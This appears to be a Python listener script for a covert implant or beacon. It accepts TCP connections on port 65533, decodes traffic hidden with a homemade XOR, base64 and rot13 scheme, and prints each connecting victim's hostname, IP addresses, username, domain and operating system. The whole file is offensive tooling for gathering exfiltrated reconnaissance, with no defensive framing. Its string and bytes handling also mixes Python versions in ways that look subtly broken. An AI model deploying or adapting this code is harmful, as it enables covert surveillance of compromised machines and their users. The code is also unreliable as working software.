import socket

# fake encryption
import base64, codecs


def fakeencryption_decode(enc):
    key = "aw9292929296983244"
    dec = []
    enc = base64.urlsafe_b64decode(str(codecs.decode(enc, "rot_13")[::-1]))
    for i in range(len(enc)):
        key_c = key[i % len(key)]
        dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)
    return "".join(dec)


def comms_send(data):
    key = "aw9292929296983244"
    enc = []
    for i in range(len(data)):
        key_c = key[i % len(key)]
        enc_c = chr((ord(data[i]) + ord(key_c)) % 256)
        enc.append(enc_c)
    conn.sendall(codecs.encode(base64.urlsafe_b64encode("".join(enc))[::-1], "rot_13"))


host = ''
port = 65533
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(-1) ####???????? Can we do infinity?
while True:
    conn, addr = s.accept()
    print("\n")
    print("IP %s connected on port %s!" % (addr[0], addr[1]))
    while True:
        data = conn.recv(1024)
        if not data: break
        clienthostname, clientip_lan, clientip_all, clientusername, clientuserdomain, clientsystem = fakeencryption_decode(
            data).split("::")
        print("Hostname: " + clienthostname)
        print("Local IP: " + clientip_lan)
        print("All IP addresses: " + clientip_all)
        print("Username: " + clientusername)
        print("Domain: " + clientuserdomain)
        print("Account: " + (
            (clientuserdomain + "\\" + clientusername) if clientuserdomain != "{unknown}" else clientusername))
        print("Client System: " + clientsystem)
        #conn.sendall(b"Acknowledged!")
        comms_send(b'acknowledged!')
    conn.close()
